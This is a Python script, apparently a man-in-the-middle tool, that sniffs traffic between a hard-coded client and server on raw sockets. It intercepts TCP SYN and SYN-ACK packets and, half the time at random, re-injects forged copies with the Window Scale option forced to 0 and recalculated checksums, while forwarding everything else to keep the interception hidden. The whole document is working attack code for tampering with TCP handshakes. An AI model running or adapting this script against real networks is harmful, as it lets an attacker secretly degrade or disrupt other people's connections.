import socket
import struct
import random

IP_HEADER = '!BBHHHBBH4s4s'
TCP_HEADER = '!HHLLBBHHH'

def calculate_ip_checksum(header):
    """Calculate the IP checksum over the header."""
    s = 0
    for i in range(0, len(header), 2):
        w = (header[i] << 8) + (header[i + 1] if i + 1 < len(header) else 0)
        s += w
    while s > 0xffff:
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff

def calculate_checksum(data):
    """Calculate the TCP checksum (assumes pseudo-header is included)."""
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
        s += w
    while s > 0xffff:
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff

def parse_tcp_packet(packet):
    """Parse IP and TCP headers from a packet."""
    # IP header (20 bytes)
    ip_header = packet[:20]
    iph = struct.unpack(IP_HEADER, ip_header)
    src_ip = socket.inet_ntoa(iph[8])
    dst_ip = socket.inet_ntoa(iph[9])

    # TCP header (assume 20 bytes + options)
    tcp_header = packet[20:48]  # Adjust based on options length
    tcph = struct.unpack(TCP_HEADER, tcp_header[:20])
    src_port, dst_port = tcph[0], tcph[1]
    seq_num, ack_num = tcph[2], tcph[3]
    data_offset = (tcph[4] >> 4) * 4  # In bytes
    flags = tcph[5]
    window_size = tcph[6]

    # Extract options (if any)
    options = packet[20 + 20:20 + data_offset] if data_offset > 20 else b''

    return {
        'src_ip': src_ip, 'dst_ip': dst_ip,
        'src_port': src_port, 'dst_port': dst_port,
        'seq_num': seq_num, 'ack_num': ack_num,
        'flags': flags, 'window_size': window_size,
        'options': options
    }

def craft_tcp_packet(parsed_packet, window_scale=0):
    """Craft a TCP packet with the specified Window Scale."""
    # IP Header fields
    ip_ver_ihl = 0x45  # Version 4, IHL 5 (20 bytes)
    ip_tos = 0
    ip_id = 54321
    ip_frag = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    src_ip_bytes = socket.inet_aton(parsed_packet['src_ip'])
    dst_ip_bytes = socket.inet_aton(parsed_packet['dst_ip'])

    # TCP Header fields
    seq_num = parsed_packet['seq_num']
    ack_num = parsed_packet['ack_num']
    data_offset = 6 << 4  # 24 bytes (20 header + 4 options)
    flags = parsed_packet['flags']
    window_size = parsed_packet['window_size']
    tcp_checksum = 0
    urgent_ptr = 0

    # TCP Options: Window Scale (3 bytes) + NOP (1 byte)
    options = bytes([3, 3, window_scale, 1])

    # Build TCP header without checksum
    tcp_header = struct.pack(TCP_HEADER, parsed_packet['src_port'], parsed_packet['dst_port'],
                             seq_num, ack_num, data_offset, flags, window_size, tcp_checksum, urgent_ptr) + options

    # Calculate TCP checksum with pseudo-header
    pseudo_header = src_ip_bytes + dst_ip_bytes + struct.pack('!BBH', 0, ip_proto, len(tcp_header))
    tcp_checksum = calculate_checksum(pseudo_header + tcp_header)
    tcp_header = struct.pack(TCP_HEADER, parsed_packet['src_port'], parsed_packet['dst_port'],
                             seq_num, ack_num, data_offset, flags, window_size, tcp_checksum, urgent_ptr) + options

    # Build IP header with correct total length
    ip_len = 20 + len(tcp_header)  # 20 (IP) + 24 (TCP) = 44 bytes
    ip_header = struct.pack(IP_HEADER, ip_ver_ihl, ip_tos, ip_len, ip_id,
                            ip_frag, ip_ttl, ip_proto, 0, src_ip_bytes, dst_ip_bytes)

    # Calculate IP checksum
    ip_checksum = calculate_ip_checksum(ip_header)
    ip_header = struct.pack(IP_HEADER, ip_ver_ihl, ip_tos, ip_len, ip_id,
                            ip_frag, ip_ttl, ip_proto, ip_checksum, src_ip_bytes, dst_ip_bytes)

    # Combine IP and TCP headers
    return ip_header + tcp_header

def process_packet(packet, client_ip, server_ip, sock_send):
    # Check if it's an IP packet with TCP (protocol 6)
    ip_header = packet[14:34]  # Skip Ethernet header
    iph = struct.unpack(IP_HEADER, ip_header)
    if iph[6] != 6:  # Not TCP
        return
    src_ip = socket.inet_ntoa(iph[8])
    dst_ip = socket.inet_ntoa(iph[9])
    # Filter for Client -> Server or Server -> Client
    if (src_ip == client_ip and dst_ip == server_ip) or (src_ip == server_ip and dst_ip == client_ip):
        parsed = parse_tcp_packet(packet[14:])  # Skip Ethernet header
        # Check for SYN or SYN-ACK
        if parsed['flags'] == 0x02 or parsed['flags'] == 0x12:  # Only SYN or SYN-ACK
            if random.random() < 0.5:  # 50% chance
                print(f"Intercepted SYN/SYN-ACK (MODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
                new_packet = craft_tcp_packet(parsed, window_scale=0)
                sock_send.sendto(new_packet, (parsed['dst_ip'], 0))
                print("Sent modified packet with Window Scale = 0")
            else:
                print(f"Intercepted SYN/SYN-ACK (UNMODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
                sock_send.sendto(packet[14:], (parsed['dst_ip'], 0))
        else:
            # Forward unmodified packet to maintain MITM
            sock_send.sendto(packet[14:], (parsed['dst_ip'], 0))

def main():
    # Network details
    client_ip = "192.168.56.10"
    server_ip = "192.168.56.20"
    interface = "enp0s3"

    # Create raw socket for sniffing
    sock_sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    sock_sniff.bind((interface, 0))

    # Create raw socket for sending
    sock_send = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    print("Sniffing for TCP SYN packets...")
    while True:
        packet, _ = sock_sniff.recvfrom(65535)
        process_packet(packet, client_ip, server_ip, sock_send)

if __name__ == "__main__":
    main()